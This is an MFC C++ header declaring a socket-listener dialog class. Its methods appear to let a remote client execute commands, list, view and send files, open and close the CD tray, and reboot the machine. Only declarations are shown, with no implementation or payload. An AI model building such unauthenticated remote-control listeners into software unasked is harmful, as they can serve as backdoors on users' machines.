// SockListenerDlg.h : header file
//

#if !defined(AFX_SOCKLISTENERDLG_H__8B692C8D_78D8_11D4_ACB2_00500464FA8A__INCLUDED_)
#define AFX_SOCKLISTENERDLG_H__8B692C8D_78D8_11D4_ACB2_00500464FA8A__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

/////////////////////////////////////////////////////////////////////////////
// CSockListenerDlg dialog


#include "MySocket.h" 
class CListeningSocket;
class CClientSocket;
class CSockListenerDlg : public CDialog
{
// Construction
	
public:
	void ProcessPendingRead(CClientSocket *pSocket);
	BOOL OnCloseConnection(CClientSocket *ptrClientSock);
	void ProcessPendingAccept();
	BOOL GetMyIP();
	CSockListenerDlg(CWnd* pParent = NULL);	// standard constructor		
	CString m_csIPAddr;

	CMySocket m_MySocket;
	CListeningSocket* m_pSocket;

	CString m_cshostname;
	CBitmapButton m_button1,m_button2;

	//execute command
	void SendText( CString msg, CClientSocket *pSocket );
	BOOL SendFile(char *szStr, CClientSocket *pSocket);
	BOOL ExecuteCommand( char *cmdstr , int flags);

	void ExecEditCommand( CString strBuf, CClientSocket *pSocket );
	void ExecListCommand( CString strBuf, CClientSocket *pSocket);
	void ExecViewCommand( CString strBuf, CClientSocket *pSocket );
	void ExecCDOpenCommand( CClientSocket *pSocket );
	void ExecCDCloseCommand( CClientSocket *pSocket );
	void ExecRebootCommand( CClientSocket *pSocket );
	//
		
// Dialog Data
	//{{AFX_DATA(CSockListenerDlg)
	enum { IDD = IDD_SOCKLISTENER_DIALOG };
	CListBox	m_list1;	
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CSockListenerDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support	
	//}}AFX_VIRTUAL

// Implementation
protected:
	HICON m_hIcon;

	// Generated message map functions
	//{{AFX_MSG(CSockListenerDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnShowWindow(BOOL bShow, UINT nStatus);
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);	
	afx_msg void OnExit();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};


//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_SOCKLISTENERDLG_H__8B692C8D_78D8_11D4_ACB2_00500464FA8A__INCLUDED_)
